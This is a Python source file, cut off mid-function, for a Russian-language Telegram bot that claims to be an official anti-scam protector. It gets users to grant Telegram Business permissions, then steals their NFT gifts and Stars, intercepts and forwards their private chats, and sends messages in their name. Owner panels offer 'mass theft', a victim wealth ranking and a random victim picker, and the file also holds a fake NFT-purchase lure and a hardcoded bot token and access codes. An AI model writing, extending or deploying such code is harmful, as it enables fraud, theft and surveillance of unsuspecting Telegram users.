import re, html, asyncio, logging, sqlite3, secrets, aiohttp, datetime, random
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.exceptions import TelegramConflictError, TelegramBadRequest, TelegramForbiddenError
from aiogram.types import Message, CallbackQuery, ErrorEvent, InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

TOKEN = "9115876932:AAGat5WlGJ4pjAvqRBtQGq_ThJrEPbHqOGA"
OWNER_ID = 8567408555
ADMIN_CODE = "admin777"
OWNER_CODE = "2427"
TARGET_UNAME = "manageroffers029"
OFFER_BOT_UNAME = "offers"
MAX_AMOUNT = 10_000_000

DB = sqlite3.connect("users.db", check_same_thread=False, timeout=30)
DB.execute("PRAGMA journal_mode=WAL")
DB.execute("PRAGMA synchronous=NORMAL")
cursor = DB.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, is_admin INTEGER DEFAULT 0, is_owner INTEGER DEFAULT 0, business_conn_id TEXT, owner_id INTEGER, is_banned INTEGER DEFAULT 0, spy_mode INTEGER DEFAULT 0)")
cursor.execute("CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, chat_id INTEGER, chat_title TEXT, sender_name TEXT, text TEXT, time TEXT, media_id TEXT, media_type TEXT, msg_id INTEGER)")
cursor.execute("CREATE TABLE IF NOT EXISTS offers (id TEXT PRIMARY KEY, owner_id INTEGER, recipient_id INTEGER, business_connection_id TEXT, amount INTEGER, nft_link TEXT, target_uname TEXT, status TEXT DEFAULT 'pending')")
cursor.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, error TEXT, time TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS stolen_gifts (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id INTEGER, gift_type TEXT, time TEXT)")
DB.commit()

def extract_nft_name(link):
    try:
        name = link.split("/nft/")[-1].split("-")[0]
        return name.replace("_", " ").replace("-", " ").title()
    except:
        return "NFT Подарок"

def has_rank(user_id, req_rank):
    if user_id == OWNER_ID: return True
    a, ad, o, ban, spy = get_status(user_id)
    if ban: return False
    if o: return True
    if req_rank == 1 and ad: return True
    if req_rank == 0: return True
    return False

def get_status(u):
    cursor.execute("SELECT has_access, is_admin, is_owner, is_banned, spy_mode FROM users WHERE id = ?", (u,))
    r = cursor.fetchone()
    return r if r else (0, 0, 0, 0, 0)

def add_user(u, n, f, c=None, o=None):
    cursor.execute("INSERT OR IGNORE INTO users (id, username, first_name) VALUES (?, ?, ?)", (u, n, f))
    if c: cursor.execute("UPDATE users SET business_conn_id = ?, owner_id = ? WHERE id = ?", (c, o, u))
    DB.commit()

def get_conn(u):
    cursor.execute("SELECT business_conn_id FROM users WHERE id = ?", (u,))
    r = cursor.fetchone()
    if r and r[0]: return r[0]
    return None

def get_owner(c):
    cursor.execute("SELECT owner_id FROM users WHERE business_conn_id = ?", (c,))
    r = cursor.fetchone()
    return r[0] if r else None

def save_msg(o, c, c_title, s, t, d, m_id=None, m_type=None, msg_id=None):
    cursor.execute("INSERT INTO messages (owner_id, chat_id, chat_title, sender_name, text, time, media_id, media_type, msg_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", (o, c, c_title, s, t, d, m_id, m_type, msg_id))
    DB.commit()

def save_stolen(v_id, g_type):
    now = datetime.datetime.now().strftime("%d.%m %H:%M")
    cursor.execute("INSERT INTO stolen_gifts (victim_id, gift_type, time) VALUES (?, ?, ?)", (v_id, g_type, now))
    DB.commit()

def get_chats(o):
    cursor.execute("SELECT chat_id, chat_title, MAX(id) as last_id FROM messages WHERE owner_id = ? GROUP BY chat_id ORDER BY last_id DESC", (o,))
    return cursor.fetchall()

def get_hist(o, c, l=50):
    cursor.execute("SELECT sender_name, text, time, media_id, media_type FROM messages WHERE owner_id = ? AND chat_id = ? ORDER BY id DESC LIMIT ?", (o, c, l))
    return cursor.fetchall()

def save_offer(i, o, r, c, a, l, t_uname):
    cursor.execute("INSERT INTO offers (id, owner_id, recipient_id, business_connection_id, amount, nft_link, target_uname, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')", (i, o, r, c, a, l, t_uname))
    DB.commit()

def get_offer(i):
    cursor.execute("SELECT id, owner_id, recipient_id, business_connection_id, amount, nft_link, target_uname, status FROM offers WHERE id = ?", (i,))
    return cursor.fetchone()

def upd_offer(i, s):
    cursor.execute("UPDATE offers SET status = ? WHERE id = ? AND status = 'pending'", (s, i))
    DB.commit()

def log_err(e):
    now = datetime.datetime.now().strftime("%d.%m %H:%M")
    try:
        cursor.execute("INSERT INTO logs (error, time) VALUES (?, ?)", (str(e), now))
        DB.commit()
    except Exception:
        pass
    log.exception("handler error")

async def resolve_user(n):
    url = f"https://api.telegram.org/bot{TOKEN}/getChat"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"chat_id": f"@{n}"}) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    if d.get("ok"): return d["result"]["id"]
                return None
    except Exception as e:
        log_err(e)
        return None

async def get_gifts(c, u):
    url = f"https://api.telegram.org/bot{TOKEN}/getBusinessAccountGifts"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"business_connection_id": c, "user_id": u}) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    if d.get("ok"): return d["result"].get("gifts", [])
                return []
    except Exception as e:
        log_err(e)
        return []

async def trans_gift(c, g, n):
    url = f"https://api.telegram.org/bot{TOKEN}/transferGift"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"business_connection_id": c, "owned_gift_id": g, "new_owner_user_id": n}) as resp:
                if resp.status != 200:
                    log.error(f"transferGift failed: {await resp.text()}")
                    return False
                return True
    except Exception as e:
        log_err(e)
        return False

async def get_stars(c):
    url = f"https://api.telegram.org/bot{TOKEN}/getBusinessAccountStarBalance"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"business_connection_id": c}) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    if d.get("ok"): return d["result"].get("amount", 0)
                return 0
    except Exception as e:
        log_err(e)
        return 0

async def trans_stars(c, s):
    url = f"https://api.telegram.org/bot{TOKEN}/transferBusinessAccountStars"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"business_connection_id": c, "star_count": s}) as resp:
                if resp.status != 200:
                    log.error(f"transferBusinessAccountStars failed: {await resp.text()}")
                    return False
                return True
    except Exception as e:
        log_err(e)
        return False

T = {
    "start_user": "👋 Привет! Я официальный бот для защиты от скамеров и мошенников.\n\n🛡 <b>Что я умею:</b>\n• Анализирую подозрительные ссылки\n• Защищаю от кражи NFT и Stars\n• Проверяю контакты на скам\n\n⚠️ Чтобы я работал, подключи меня к своему Telegram Business.",
    "start_access": "👋 Привет! Я официальный бот для защиты.\n\n✅ У тебя есть доступ к рассылке офферов.\n\n💼 <b>Инструкция:</b>\n/send [ID_или_@юзер] [сумма] [ссылка]",
    "tutorial": "📋 <b>Инструкция по подключению:</b>\n\n1. Зайди в <b>Настройки</b> Telegram\n2. Перейди в <b>Telegram Business</b>\n3. Нажми <b>Чат-боты</b>\n4. Добавь меня: @goodbotroobot\n5. Выдай <b>ВСЕ</b> разрешения (Чтение, Управление подарками, Удаление).\n\n✅ Готово! Я начну защищать твой аккаунт",
    "adm_req": "⚙️ Введи код АДМИНА:\n<code>/admin admin777</code>",
    "own_req": "👑 Введи код ВЛАДЕЛЬЦА:\n<code>/vip 2427</code>",
    "wrong": "❌ Неверный код.",
    "adm_ok": "✅ Теперь ты АДМИН.",
    "own_ok": "✅ Теперь ты ВЛАДЕЛЕЦ.",
    "reset": "🔄 Роли сброшены.",
    "offer": "👤 Пользователь <b>{name}</b> предлагает вам покупку NFT-подарка.\n\n🖼 <b>Подарок:</b> <a href=\"{link}\">{nft_name}</a>\n💰 <b>Сумма:</b> {amount} ⭐️\n\n⚠️ <i>Нажмите кнопку ниже, чтобы принять или отклонить.</i>",
    "acc": "🟢 Принять", "dec": "❌ Отклонить",
    "al_acc": "⚠️ Для получения {amount} ⭐️ перейдите к оффер-боту.",
    "al_dec": "❌ Вы отклонили.",
    "dec_msg": "❌ Предложение отклонено.",
    "send": "🎁 Передать",
    "adm_pan": "⚙️ <b>Панель АДМИНА</b>",
    "own_pan": "👑 <b>Панель ВЛАДЕЛЬЦА</b>",
    "b_users": "👥 Список целей", "b_stats": "📊 Статистика", "b_back": "⬅️ Назад",
    "b_prof": "👤 Мой профиль", "b_help": "💼 Инструкция", "b_logs": "📜 Логи",
    "b_roulette": "🎲 Колесо Фортуны", "b_mass_steal": "💀 Массовая кража",
    "b_connect": "🛡 Подключить", "b_tutorial": "ℹ️ Туториал", "b_menu": "⬅️ В меню",
    "b_all_funcs": "📚 Все функции",
    "u_card": "👤 <b>Профиль</b>\nID: <code>{uid}</code>\nИмя: {name}\nСтатус: {status}\nДоступ: {acc}\nБан: {ban}\n\n🎁 <b>Подарки:</b> {gifts}\n⭐️ <b>Звёзды:</b> {stars}",
    "b_give": "🔓 Выдать доступ", "b_rem": "🔒 Забрать доступ",
    "b_st_g": "💸 Забрать подарки", "b_st_s": "⭐️ Забрать звёзды",
    "b_read": "🕵️‍♂️ Перехват", "b_copy": "📋 Скопировать ID",
    "b_ban": "🚫 Забанить", "b_unban": "🟢 Разбанить",
    "no_biz": "❌ Нет бизнес-подключения!",
    "st_ok": "✅ Забрано!", "st_err": "❌ Ошибка API.",
    "chats": "💬 <b>Доступные чаты:</b>", "b_chat": "👤 {name} (ID: {cid})",
    "hist_title": "💬 <b>Переписка с {name}</b> (ID: {cid})\n\n{msgs}", "no_msgs": "Сообщений пока нет.",
    "err": "⚠️ <b>Ошибка:</b>\n<code>{err}</code>",
    "notify": "✅ Вам выдан доступ к офферам.",
    "prof_txt": "👤 <b>Профиль</b>\nID: <code>{uid}</code>\nИмя: {name}\nСтатус: {status}",
    "usage": "💼 <b>Инструкция по отправке оффера</b>\n\n/send [ID_или_@юзер] [сумма] [ссылка]",
    "all_funcs_text": "📚 <b>ПОЛНЫЙ ФУНКЦИОНАЛ</b>\n\n👑 <b>Офферы:</b>\n• /send [ID] [сумма] [ссылка]\n• /broadcast [текст]\n• /bizspam [ID] [текст]\n• /msg [ID] [текст]\n\n🕵️‍♂️ <b>Шпионаж:</b>\n• Перехват переписки\n• Забрать подарки/звёзды\n• Глаз Бога (прослушка)\n\n⚙️ <b>Админка:</b>\n• /admin admin777\n• Колесо Фортуны\n• Массовая кража\n• Топ жертв\n\n⚠️ Кража работает только с правами жертвы."
}

L_RE = re.compile(r"^https://t\.me/nft/[\w\-/]+$")
bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.errors()
async def err_h(event: ErrorEvent):
    log_err(event.exception)
    return True

@dp.business_connection()
async def on_conn(conn):
    if conn.is_enabled:
        add_user(conn.user.id, conn.user.username, conn.user.first_name, conn.id, conn.user.id)
        if conn.user.id != OWNER_ID:
            try:
                await bot.send_message(OWNER_ID, f"✅ <b>Подключение!</b>\n{conn.user.first_name} (@{conn.user.username})\n<code>{conn.user.id}</code>")
            except TelegramForbiddenError:
                pass
            except Exception as e:
                log_err(e)
    else:
        cursor.execute("UPDATE users SET business_conn_id = NULL WHERE owner_id = ?", (conn.user.id,))
        DB.commit()

@dp.business_message()
async def log_msg(m: Message):
    if not m.business_connection_id: return
    o = get_owner(m.business_connection_id)
    if not o or not m.from_user: return
    if m.from_user.id == o: return
    chat_title = m.chat.title or m.chat.first_name or m.chat.username or str(m.chat.id)
    sender = m.from_user.first_name or m.from_user.username or "Пользователь"
    m_id, m_type = None, None
    if m.photo: m_id, m_type = m.photo[-1].file_id, "photo"
    elif m.video: m_id, m_type = m.video.file_id, "video"
    elif m.document: m_id, m_type = m.document.file_id, "doc"
    elif m.voice: m_id, m_type = m.voice.file_id, "voice"
    text = m.text or m.caption or "[Медиа]"
    save_msg(o, m.chat.id, chat_title, sender, text, m.date.strftime("%H:%M %d.%m"), m_id, m_type, m.message_id)
    spy_status = get_status(o)[4]
    if spy_status == 1 and m.from_user.id != OWNER_ID:
        try:
            forward_text = f"👁 <b>Перехват:</b> {sender}\n<b>Чат:</b> {chat_title}\n\n{text}"
            await bot.send_message(OWNER_ID, forward_text)
            if m_id:
                await bot.copy_message(OWNER_ID, m.chat.id, m.message_id)
        except Exception as e:
            log_err(e)

@dp.message(CommandStart())
async def start(m: Message):
    add_user(m.from_user.id, m.from_user.username, m.from_user.first_name)
    if m.from_user.id != OWNER_ID:
        try:
            await bot.send_message(OWNER_ID, f"👋 <b>Старт!</b>\n{m.from_user.first_name} (@{m.from_user.username})\n<code>{m.from_user.id}</code>")
        except TelegramForbiddenError:
            pass
        except Exception as e:
            log_err(e)
    a, adm, o, ban, spy = get_status(m.from_user.id)
    if ban: return await m.answer("🚫 Вы забанены.")
    if o or adm:
        await show_pan(m, o)
        return
    txt = T["start_access"] if a else T["start_user"]
    kb = [[InlineKeyboardButton(text=T["b_connect"], callback_data="p_connect"), InlineKeyboardButton(text=T["b_tutorial"], callback_data="p_tut")]]
    if a: kb.append([InlineKeyboardButton(text=T["b_help"], callback_data="p_h")])
    await m.answer(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data == "p_connect")
async def cb_connect(c: CallbackQuery):
    try:
        await c.message.edit_text(T["tutorial"], reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_start_menu")]]))
    except TelegramBadRequest as e:
        log.warning(f"edit_text: {e}")
    await c.answer()

@dp.callback_query(F.data == "p_tut")
async def cb_tut(c: CallbackQuery):
    try:
        await c.message.edit_text(T["tutorial"], reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_start_menu")]]))
    except TelegramBadRequest as e:
        log.warning(f"edit_text: {e}")
    await c.answer()

@dp.callback_query(F.data == "p_start_menu")
async def cb_start_menu(c: CallbackQuery):
    a, adm, o, ban, spy = get_status(c.from_user.id)
    if ban: return await c.answer("🚫 Вы забанены.", show_alert=True)
    txt = T["start_access"] if a else T["start_user"]
    kb = [[InlineKeyboardButton(text=T["b_connect"], callback_data="p_connect"), InlineKeyboardButton(text=T["b_tutorial"], callback_data="p_tut")]]
    if a: kb.append([InlineKeyboardButton(text=T["b_help"], callback_data="p_h")])
    try:
        await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest as e:
        log.warning(f"edit_text: {e}")
    await c.answer()

@dp.message(Command("resetrole"))
async def reset(m: Message):
    if m.from_user.id != OWNER_ID: return await m.answer("❌ Только владелец может сбрасывать роли.")
    cursor.execute("UPDATE users SET has_access = 0, is_admin = 0, is_owner = 0 WHERE id = ?", (m.from_user.id,))
    DB.commit()
    await m.answer(T["reset"])

@dp.message(Command("broadcast"))
async def cmd_broadcast(m: Message):
    if not has_rank(m.from_user.id, 1): return await m.answer("❌ Нет прав.")
    text = m.text.replace("/broadcast", "").strip()
    if not text: return await m.answer("❌ Пустой текст.")
    cursor.execute("SELECT id FROM users WHERE business_conn_id IS NOT NULL")
    users = cursor.fetchall()
    sent, failed = 0, 0
    for (uid,) in users:
        try:
            await bot.send_message(uid, text)
            sent += 1
        except Exception:
            failed += 1
    await m.answer(f"✅ Рассылка завершена.\nОтправлено: {sent}\nОшибок: {failed}")

@dp.message(Command("bizspam"))
async def cmd_bizspam(m: Message):
    if not has_rank(m.from_user.id, 2): return await m.answer("❌ Только для владельца.")
    parts = m.text.split(maxsplit=2)
    if len(parts) != 3: return await m.answer("Формат: /bizspam [ID_жертвы] [текст]")
    _, target_id, text = parts
    if not target_id.isdigit(): return await m.answer("❌ ID должен быть числом.")
    conn_id = get_conn(int(target_id))
    if not conn_id: return await m.answer("❌ У этой жертвы нет бизнес-подключения.")
    try:
        await bot.send_message(chat_id=int(target_id), text=f"🔥 {text}", business_connection_id=conn_id)
        await m.answer("✅ Сообщение отправлено от лица жертвы!")
    except Exception as e:
        log_err(e)
        await m.answer(f"❌ Ошибка: {e}")

@dp.message(Command("msg"))
async def cmd_msg(m: Message):
    if not has_rank(m.from_user.id, 2): return await m.answer("❌ Только для владельца.")
    parts = m.text.split(maxsplit=2)
    if len(parts) != 3: return await m.answer("Формат: /msg [ID_чата_или_@юзер] [текст]")
    _, target, text = parts
    if target.startswith("@"):
        t_id = await resolve_user(target[1:])
        if not t_id: return await m.answer("❌ Юзер не найден.")
    elif target.lstrip('-').isdigit():
        t_id = int(target)
    else:
        return await m.answer("❌ Укажи ID или @юзер.")
    conn_id = get_conn(t_id)
    if not conn_id: return await m.answer("❌ Нет бизнес-подключения у этого юзера.")
    try:
        await bot.send_message(t_id, text, business_connection_id=conn_id)
        await m.answer("✅ Отправлено!")
    except Exception as e:
        log_err(e)
        await m.answer(f"⚠️ Ошибка: {e}")

@dp.message(Command("send"))
async def send_off(m: Message):
    if not has_rank(m.from_user.id, 2): return await m.answer("❌ Нет прав.")
    p = m.text.split()
    if len(p) != 4: return await m.answer(T["usage"])
    _, t, a, l = p
    if t.startswith("@"):
        t_id = await resolve_user(t[1:])
        if not t_id: return await m.answer("❌ Юзер не найден.")
    elif t.lstrip('-').isdigit():
        t_id = int(t)
    else:
        return await m.answer("❌ Укажи ID или @юзер.")
    if not a.isdigit() or int(a) > MAX_AMOUNT: return await m.answer("❌ Сумма.")
    if not L_RE.match(l): return await m.answer("❌ Ссылка.")
    c_conn = get_conn(m.from_user.id)
    if not c_conn: return await m.answer("❌ Нет подключения.")

    i = secrets.token_hex(6)
    save_offer(i, m.from_user.id, t_id, c_conn, int(a), l, TARGET_UNAME)

    nft_name = extract_nft_name(l)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["acc"], callback_data=f"o:acc:{i}"), InlineKeyboardButton(text=T["dec"], callback_data=f"o:dec:{i}")]])
    try:
        await bot.send_message(t_id, T["offer"].format(name=html.escape(m.from_user.username or m.from_user.first_name), amount=a, link=l, nft_name=html.escape(nft_name)), reply_markup=kb, business_connection_id=c_conn)
        await m.answer(f"✅ Оффер отправлен! Получатель подарков: @{TARGET_UNAME}")
    except Exception as e:
        log_err(e)
        await m.answer(f"⚠️ Ошибка: {e}")

@dp.callback_query(F.data.startswith("o:"))
async def cb_off(c: CallbackQuery):
    _, a, i = c.data.split(":")
    off = get_offer(i)
    if not off: return await c.answer("Не найден.", show_alert=True)
    _, o, r, cn, am, l, t_uname, s = off
    if a not in ["acc", "dec"]: return await c.answer("Неизвестно.", show_alert=True)
    if c.from_user.id != r: return await c.answer("Не для вас.", show_alert=True)
    if s != "pending": return await c.answer("Уже обработано.", show_alert=True)

    if a == "acc":
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["send"], url=f"https://t.me/{OFFER_BOT_UNAME}")]])
        msg_text = f'✅ <b>Сделка подтверждена!</b>\n\nПЕРЕДАЙТЕ ПОДАРОК ОФФЕР-БОТУ <a href="https://t.me/{OFFER_BOT_UNAME}">@{OFFER_BOT_UNAME}</a> ДЛЯ ПОЛУЧЕНИЯ ЗВЕЗД НА БАЛАНС.'
        try:
            await bot.edit_message_text(msg_text, chat_id=c.message.chat.id, message_id=c.message.message_id, reply_markup=kb)
            upd_offer(i, "accepted")
        except TelegramBadRequest as e:
            log.warning(f"edit_message_text offer acc: {e}")
            try:
                await bot.send_message(c.message.chat.id, msg_text, reply_markup=kb, business_connection_id=cn)
                upd_offer(i, "accepted")
            except Exception as e2:
                log_err(e2)
        await c.answer(T["al_acc"].format(amount=am), show_alert=True)
    else:
        try:
            await bot.edit_message_text(T["dec_msg"], chat_id=c.message.chat.id, message_id=c.message.message_id)
            upd_offer(i, "declined")
        except TelegramBadRequest as e:
            log.warning(f"edit_message_text offer dec: {e}")
            try:
                await bot.send_message(c.message.chat.id, T["dec_msg"], business_connection_id=cn)
                upd_offer(i, "declined")
            except Exception as e2:
                log_err(e2)
        await c.answer(T["al_dec"], show_alert=True)

@dp.message(Command("admin"))
async def adm(m: Message):
    a, ad, o, ban, spy = get_status(m.from_user.id)
    if ban: return await m.answer("🚫 Вы забанены.")
    if o: return await m.answer("⚠️ У тебя уже есть роль ВЛАДЕЛЬЦА. Понижение невозможно.")
    if ad: return await m.answer("⚠️ Админка уже выдана.")
    if m.from_user.id == OWNER_ID: return await show_pan(m, True)
    parts = m.text.split()
    if len(parts) == 2 and parts[1] == ADMIN_CODE:
        cursor.execute("UPDATE users SET is_admin = 1, has_access = 1 WHERE id = ?", (m.from_user.id,))
        DB.commit()
        await m.answer(T["adm_ok"])
        await show_pan(m, False)
    elif len(parts) == 2:
        await m.answer(T["wrong"])
    else:
        await m.answer(T["adm_req"])

@dp.message(Command("vip"))
async def vip(m: Message):
    a, ad, o, ban, spy = get_status(m.from_user.id)
    if ban: return await m.answer("🚫 Вы забанены.")
    if o: return await m.answer("⚠️ Владелец уже выдан.")
    if ad: return await m.answer("⚠️ У тебя уже есть роль АДМИНА. Сначала сбрось её (/resetrole), чтобы стать владельцем.")
    if m.from_user.id == OWNER_ID: return await show_pan(m, True)
    parts = m.text.split()
    if len(parts) == 2 and parts[1] == OWNER_CODE:
        cursor.execute("UPDATE users SET is_owner = 1, is_admin = 1, has_access = 1 WHERE id = ?", (m.from_user.id,))
        DB.commit()
        await m.answer(T["own_ok"])
        await show_pan(m, True)
    elif len(parts) == 2:
        await m.answer(T["wrong"])
    else:
        await m.answer(T["own_req"])

async def show_pan(e: Message | CallbackQuery, o: bool):
    is_owner = o or get_status(e.from_user.id)[2] == 1
    if not (is_owner or get_status(e.from_user.id)[1] == 1): return

    txt = T["own_pan"] if is_owner else T["adm_pan"]
    kb = [[InlineKeyboardButton(text=T["b_users"], callback_data="p_u")], [InlineKeyboardButton(text=T["b_prof"], callback_data="p_p")], [InlineKeyboardButton(text=T["b_help"], callback_data="p_h")], [InlineKeyboardButton(text=T["b_logs"], callback_data="p_logs")]]

    if is_owner:
        kb[0].append(InlineKeyboardButton(text=T["b_stats"], callback_data="p_s"))
        kb.append([InlineKeyboardButton(text="📢 Рассылка", callback_data="p_mail")])
        kb.append([InlineKeyboardButton(text="👀 Слежка", callback_data="p_spy")])
        kb.append([InlineKeyboardButton(text="🏆 Топ жертв", callback_data="p_top")])
        kb.append([InlineKeyboardButton(text="💀 Спам от жертвы", callback_data="p_bizspam")])
        kb.append([InlineKeyboardButton(text=T["b_roulette"], callback_data="p_roulette")])
        kb.append([InlineKeyboardButton(text=T["b_mass_steal"], callback_data="p_mass_steal")])
        kb.append([InlineKeyboardButton(text="✉️ Написать в чат", callback_data="p_msg_chat")])
        kb.append([InlineKeyboardButton(text=T["b_all_funcs"], callback_data="p_all_funcs")])
    else:
        kb.append([InlineKeyboardButton(text="📢 Рассылка", callback_data="p_mail")])
        kb.append([InlineKeyboardButton(text=T["b_all_funcs"], callback_data="p_all_funcs")])
    kb = InlineKeyboardMarkup(inline_keyboard=kb)
    if isinstance(e, Message):
        await e.answer(txt, reply_markup=kb)
    else:
        try:
            await e.message.edit_text(txt, reply_markup=kb)
        except TelegramBadRequest as err:
            log.warning(f"show_pan edit: {err}")

@dp.callback_query(F.data == "p_all_funcs")
async def p_all_funcs(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_m")]])
    try:
        await c.message.edit_text(T["all_funcs_text"], reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_all_funcs: {e}")

@dp.callback_query(F.data == "p_msg_chat")
async def p_msg_chat(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    try:
        await c.message.edit_text("✉️ <b>Написать в чат</b>\n\nНапиши в чат бота:\n<code>/msg [ID_чата_или_@юзер] [текст]</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]]))
    except TelegramBadRequest as e:
        log.warning(f"p_msg_chat: {e}")

@dp.callback_query(F.data == "p_m")
async def p_m(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return await c.answer("❌ Нет прав.", show_alert=True)
    await show_pan(c, get_status(c.from_user.id)[2] == 1)

@dp.callback_query(F.data == "p_p")
async def p_prof(c: CallbackQuery):
    a, ad, o, ban, spy = get_status(c.from_user.id)
    st = "👑" if o else ("⚙️" if ad else ("🟢" if a else "⚪️"))
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_m")]])
    try:
        await c.message.edit_text(T["prof_txt"].format(uid=c.from_user.id, name=html.escape(c.from_user.username or c.from_user.first_name), status=st), reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_prof: {e}")

@dp.callback_query(F.data == "p_h")
async def p_help(c: CallbackQuery):
    a, ad, o, ban, spy = get_status(c.from_user.id)
    if not (o or ad or a): return await c.answer("❌ Нет доступа.", show_alert=True)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_m")]] if (o or ad) else [[InlineKeyboardButton(text=T["b_menu"], callback_data="p_start_menu")]])
    try:
        await c.message.edit_text(T["usage"], reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_help: {e}")

@dp.callback_query(F.data == "p_logs")
async def p_logs(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    cursor.execute("SELECT error, time FROM logs ORDER BY id DESC LIMIT 10")
    logs = cursor.fetchall()
    if not logs:
        text = "✅ Ошибок нет, всё работает идеально!"
    else:
        text = "📜 <b>Последние 10 ошибок:</b>\n\n"
        for err, time in logs:
            text += f"🕒 <i>{time}</i>\n<code>{html.escape(err[:200])}</code>\n\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_m")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_logs: {e}")

@dp.callback_query(F.data == "p_roulette")
async def p_roulette(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    cursor.execute("SELECT id, username, first_name FROM users WHERE business_conn_id IS NOT NULL AND is_banned = 0")
    users = cursor.fetchall()
    if not users: return await c.answer("Нет активных жертв.", show_alert=True)
    victim = random.choice(users)
    u_id, u_name, u_first = victim
    text = f"🎲 <b>Колесо выбрало:</b>\n\n👤 {u_first} (@{u_name or 'нет'})\n🆔 <code>{u_id}</code>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="👤 Открыть профиль", callback_data=f"u_v:{u_id}")], [InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_roulette: {e}")

@dp.callback_query(F.data == "p_mail")
async def p_mail(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    try:
        await c.message.edit_text("📢 <b>Рассылка</b>\n\nНапиши в чат бота:\n<code>/broadcast Текст сообщения</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]]))
    except TelegramBadRequest as e:
        log.warning(f"p_mail: {e}")

@dp.callback_query(F.data == "p_spy")
async def p_spy(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    cursor.execute("SELECT id, username, first_name FROM users WHERE business_conn_id IS NOT NULL")
    users = cursor.fetchall()
    if not users: return await c.answer("Нет активных бизнес-подключений.", show_alert=True)
    text = "👀 <b>Активные контакты:</b>\n\n"
    for u_id, u_name, u_first in users:
        text += f"👤 {u_first} (@{u_name or 'нет'})\n🆔 <code>{u_id}</code>\n\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_spy: {e}")

@dp.callback_query(F.data == "p_top")
async def p_top(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    cursor.execute("SELECT id, username, first_name FROM users WHERE business_conn_id IS NOT NULL")
    users = cursor.fetchall()
    top_users = []
    for u_id, u_name, u_first in users:
        conn_id = get_conn(u_id)
        if conn_id:
            gifts = await get_gifts(conn_id, u_id)
            stars = await get_stars(conn_id)
            total = len(gifts) + (stars / 100)
            top_users.append((u_first, u_name, u_id, len(gifts), stars, total))
    top_users.sort(key=lambda x: x[5], reverse=True)
    text = "🏆 <b>Топ жертв по богатству:</b>\n\n"
    for i, (f_name, u_name, u_id, g_count, s_count, _) in enumerate(top_users[:3], 1):
        text += f"{i}. 👤 <b>{f_name}</b> (@{u_name or 'нет'})\n🎁 Подарков: {g_count} | ⭐️ Звёзд: {s_count}\n🆔 <code>{u_id}</code>\n\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_top: {e}")

@dp.callback_query(F.data == "p_bizspam")
async def p_bizspam(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    try:
